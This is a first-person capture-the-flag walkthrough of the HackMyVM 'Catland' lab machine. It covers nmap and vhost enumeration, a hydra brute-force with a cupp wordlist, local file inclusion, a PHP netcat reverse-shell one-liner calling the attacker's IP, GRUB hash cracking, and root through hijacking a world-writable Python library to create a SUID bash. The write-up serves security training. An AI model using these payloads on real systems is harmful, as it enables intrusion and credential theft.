### 1. Initial Reconnaissance

I began by performing an Nmap scan to identify open ports and services on the target machine, `192.168.1.10`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.10 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 19:01 CDT
Nmap scan report for catland.hmv (192.168.1.10)
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: |   3072 c7:10:14:a8:9a:f0:25:1e:0d:b1:c6:6f:1c:a1:88:d8 (RSA)
|   256 1b:66:f4:e5:b6:23:6e:77:8e:9e:c1:78:c5:bc:ac:e9 (ECDSA)
|_  256 f4:e9:d8:7a:08:15:d0:92:90:14:df:b3:ec:81:a1:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Catland
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:FF:03:8A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.16 seconds
```

The Nmap scan revealed two open ports:

- **Port 22 (SSH):** Running OpenSSH 8.4p1 on Debian.
- **Port 80 (HTTP):** Running Apache httpd 2.4.54 on Debian, with the title "Catland".


### 2. Web Enumeration

I started by enumerating directories on the web server using `gobuster`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ gobuster dir -u 192.168.1.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# ... (truncated output) ...
/images               (Status: 301) [Size: 313] [--> http://192.168.1.10/images/]
/server-status        (Status: 403) [Size: 277]
# ... (truncated output) ...
```

The `gobuster` scan found `/images` and `/server-status`. I then used `ffuf` to check for virtual hosts, as the Nmap title was "Catland" but the machine name was `catland.hmv`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ ffuf -u 'http://catland.hmv' -H "Host: FUZZ.catland.hmv" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 757
# ... (truncated output) ...
admin                   [Status: 200, Size: 1068, Words: 103, Lines: 24, Duration: 10ms]
# ... (truncated output) ...
```

`ffuf` revealed the virtual host `admin.catland.hmv`. I added `admin.catland.hmv` to my `/etc/hosts` file.

Next, I explored the `/images` directory, which had directory listing enabled:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ curl http://catland.hmv/images/
# ... (truncated HTML output) ...
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="laura-with-cat.jpeg">laura-with-cat.jpeg</a></td><td align="right">2023-01-01 08:43  </td><td align="right">6.9K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="sushi-cat.jpeg">sushi-cat.jpeg</a></td><td align="right">2023-01-01 08:43  </td><td align="right">5.8K</td><td>&nbsp;</td></tr>
# ... (truncated output) ...
```

The image `laura-with-cat.jpeg` suggested "laura" might be a username.

### 3. Credential Generation and Brute-forcing (Web Panel)

I used `cupp` (Common User Passwords Profiler) to generate a custom wordlist based on the potential username "laura" and the theme "cat".

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ python3 cupp.py -i
# ... (cupp interactive prompts) ...
> First Name: laura
# ... (other prompts) ...
> Pet's name: cat
> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: cat
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y
# ... (truncated output) ...
[+] Saving dictionary to laura.txt, counting 5656 words.
```

This generated `laura.txt`. I then used `hydra` to brute-force the login form on `admin.catland.hmv` using `laura` as the username and the generated wordlist.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ hydra -l laura -P laura.txt admin.catland.hmv http-post-form "/:username=^USER^&password=^PASS^:Invalid" -I
# ... (truncated output) ...
[80][http-post-form] host: admin.catland.hmv   login: laura   password: Laura_2008
1 of 1 target successfully completed, 1 valid password found
```

The brute-force attack was successful, revealing the credentials `laura:Laura_2008` for the web panel.

### 4. Gaining Initial Shell (www-data)

I logged into `admin.catland.hmv` with the found credentials. After logging in, I noticed a file upload functionality and a `user.php` page. I used `ffuf` to check for Local File Inclusion (LFI) on `user.php`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ ffuf -u 'http://admin.catland.hmv/user.php?FUZZ=/etc/passwd' -H 'Cookie: PHPSESSID=4cvn213l10ihv3iic9nduphk2a; auth=1' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 695
# ... (truncated output) ...
page                    [Status: 200, Size: 2225, Words: 113, Lines: 59, Duration: 2ms]
# ... (truncated output) ...
```

This confirmed that `user.php` was vulnerable to LFI via the `page` parameter. I verified this by directly requesting `/etc/passwd`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ curl 'http://admin.catland.hmv/user.php?page=/etc/passwd' -H 'Cookie: PHPSESSID=4cvn213l10ihv3iic9nduphk2a; auth=1'
# ... (truncated HTML output) ...
root:x:0:0:root:/root:/bin/bash
# ... (content of /etc/passwd) ...
laura:x:1001:1001:,,,:/home/laura:/bin/bash
# ... (truncated output) ...
```

The LFI vulnerability allowed me to read arbitrary files. I then uploaded a PHP reverse shell (named `shell.php.zip` to bypass potential file type restrictions) to the `/uploads` directory. I modified the IP and port in the shell to my Kali machine's IP (`192.168.1.5`) and port (`4444`).

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.5 4444 >/tmp/f'); ?>" > shell.php.zip
```

I set up a `netcat` listener on my Kali machine:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ nc -lvnp 4444
```

Then, I triggered the reverse shell by accessing the uploaded file via the LFI vulnerability:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ curl 'http://admin.catland.hmv/user.php?page=uploads/shell.php.zip' -H 'Cookie: PHPSESSID=4cvn213l10ihv3iic9nduphk2a; auth=1'
```

This resulted in a connection on my `netcat` listener:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.10 48402
Linux catland.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I obtained a shell as the `www-data` user. I then upgraded it to a full TTY shell:

```shellscript
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@catland:/$
```

### 5. User Flag and Database Credentials

As `www-data`, I navigated to `/home/laura` and found the `user.txt` file.

```shellscript
www-data@catland:/$ cd /home/laura
www-data@catland:/home/laura$ ls -la
# ... (truncated output) ...
-rwx------ 1 laura laura   33 Jan  1  2023 user.txt
www-data@catland:/home/laura$ cat user.txt
933ff8025e8944b6b3b797b2f006b2c0
```

The user flag is `933ff8025e8944b6b3b797b2f006b2c0`.

Next, I looked for configuration files in the web root. I found `config.php` in `/var/www/admin/`.

```shellscript
www-data@catland:/var/www/admin$ cat config.php
<?php
$hostname = "localhost";
$database = "catland";
$username = "admin";
$password = "catlandpassword123";
$conn = mysqli_connect($hostname, $username, $password, $database);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
?>
```

This file contained database credentials: `username = "admin"`, `password = "catlandpassword123"`. I used these to connect to the MariaDB database.

```shellscript
www-data@catland:/var/www/admin$ mysql -u admin -p
Enter password: catlandpassword123
Welcome to the MariaDB monitor.
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| catland            |
| information_schema |
+--------------------+
MariaDB [(none)]> use catland;
Database changed
MariaDB [catland]> show tables;
+-------------------+
| Tables_in_catland |
+-------------------+
| comment           |
| users             |
+-------------------+
MariaDB [catland]> select * from users;
+----------+------------+
| username | password   |
+----------+------------+
| laura    | laura_2008 |
+----------+------------+
```

The `users` table confirmed the `laura:Laura_2008` credentials found earlier for the web panel. The `comment` table contained a hint: `change grub password`. This suggested a potential path for root escalation or further user access.

### 6. Further User Access: Cracking GRUB Password

Following the hint from the `comment` table, I checked the GRUB configuration file for a password hash.

```shellscript
www-data@catland:/var/www/admin$ cat /boot/grub/grub.cfg
# ... (truncated output) ...
### BEGIN /etc/grub.d/01_password ###
set superusers="root"
password_pbkdf2 root grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC
### END /etc/grub.d/01_password ###
# ... (truncated output) ...
```

I extracted the GRUB password hash: `grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC`.

I saved this hash to a file named `hash.txt` on my Kali machine and used `hashid` to identify its type:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ echo "grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC" > hash.txt
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ hashid 'grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC'
Analyzing 'grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC'
[+] GRUB 2
```

The hash was identified as GRUB 2. I then used `john the ripper` with the `rockyou.txt` wordlist to crack it:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/catland/cupp]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# ... (truncated output) ...
berbatov         (?)
1g 0:00:00:57 DONE (2025-07-23 18:47) 0.01743g/s 522.7p/s 522.7c/s 522.7C/s candy15..axelito
```

The password `berbatov` was successfully cracked. I then used this password to switch user to `laura` from the `www-data` shell, as the `Laura_2008` password found earlier was only for the web panel and did not work for system login.

```shellscript
www-data@catland:/var/www/admin$ su laura
Password: berbatov
laura@catland:/var/www/admin$
```

This successfully elevated my privileges to the `laura` user.

### 7. Privilege Escalation to `root`

As `laura`, I checked `sudo` permissions:

```shellscript
laura@catland:~$ sudo -l
Matching Defaults entries for laura on catland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User laura may run the following commands on catland:
    (ALL : ALL) NOPASSWD: /usr/bin/rtv --help
```

`laura` can run `/usr/bin/rtv --help` as `root` without a password. I inspected the `rtv` script:

```shellscript
laura@catland:~$ cat /usr/bin/rtv
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'rtv==1.27.0','console_scripts','rtv'
import re
import sys
# for compatibility with easy_install; see #2198
__requires__ = 'rtv==1.27.0'
try:
    from importlib.metadata import distribution
except ImportError:
    try:
        from importlib_metadata import distribution
    except ImportError:
        from pkg_resources import load_entry_point
# ... (truncated output) ...
```

The script is a Python 3 script and imports `importlib.metadata`. I checked the permissions of `metadata.py`:

```shellscript
laura@catland:/usr/lib/python3.9/importlib$ ls -la metadata.py
-rw-r--rw-  1 root root 18210 Feb 28  2021 metadata.py
```

Crucially, `metadata.py` has `rw` permissions for "others" (the last `rw-`), meaning `laura` (who is not `root` but is "other") can write to this file. This is a Python library hijacking vulnerability.

I overwrote `metadata.py` with a malicious payload to create a SUID root shell:

```shellscript
laura@catland:/usr/lib/python3.9/importlib$ cat << 'EOF' > metadata.py
> import os
> os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
> EOF
```

Now, when `sudo /usr/bin/rtv --help` is executed, the `rtv` script will import `importlib.metadata`, which will execute my malicious code.

```shellscript
laura@catland:/usr/lib/python3.9/importlib$ sudo /usr/bin/rtv --help
# ... (rtv help output) ...
```

After executing the `sudo` command, I checked `/tmp` for the `rootbash` binary:

```shellscript
laura@catland:/usr/lib/python3.9/importlib$ ls -la /tmp
# ... (truncated output) ...
-rwsr-xr-x  1 root root 1234376 Jul 24 02:00 rootbash
# ... (truncated output) ...
```

The `rootbash` binary was successfully created with SUID permissions. I executed it to get a root shell:

```shellscript
laura@catland:/usr/lib/python3.9/importlib$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(laura) gid=1001(laura) euid=0(root) groups=1001(laura)
```

I obtained a root shell! Finally, I navigated to `/root` and retrieved the root flag.

```shellscript
rootbash-5.1# cd /root
rootbash-5.1# ls
root.txt
rootbash-5.1# cat root.txt
ca555fc5afb4475bb0878d2b1a76cbe9
```

The root flag is `ca555fc5afb4475bb0878d2b1a76cbe9`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified open SSH and Apache services.
2. **Web Enumeration:** Discovered the `admin.catland.hmv` virtual host and potential username "laura" from image names.
3. **Credential Generation & Brute-forcing (Web Panel):** Used `cupp` to create a targeted wordlist and `hydra` to brute-force the admin login, finding `laura:Laura_2008` for the web panel.
4. **Gaining Initial Shell (www-data):**

1. Identified an LFI vulnerability in `user.php`.
2. Uploaded a PHP reverse shell to the `/uploads` directory.
3. Triggered the reverse shell via LFI to get a `www-data` shell.



5. **User Flag & Database Credentials:**

1. Found `user.txt` in `/home/laura`.
2. Extracted database credentials from `config.php` and confirmed `laura:Laura_2008` in the `catland` database.



6. **Further User Access: Cracking GRUB Password:**

1. Discovered a GRUB 2 password hash in `/boot/grub/grub.cfg`.
2. Used `john the ripper` to crack the hash, revealing `berbatov` as the system password for `laura`.
3. Used `su laura` with `berbatov` to switch to the `laura` user.



7. **Privilege Escalation to `root`:**

1. Identified `laura` could run `/usr/bin/rtv --help` as `root` via `sudo` without a password.
2. Discovered `laura` had write permissions to `/usr/lib/python3.9/importlib/metadata.py`.
3. Hijacked `metadata.py` to execute a command that creates a SUID `rootbash` in `/tmp`.
4. Executed `rootbash` to gain a root shell and retrieved `root.txt`.
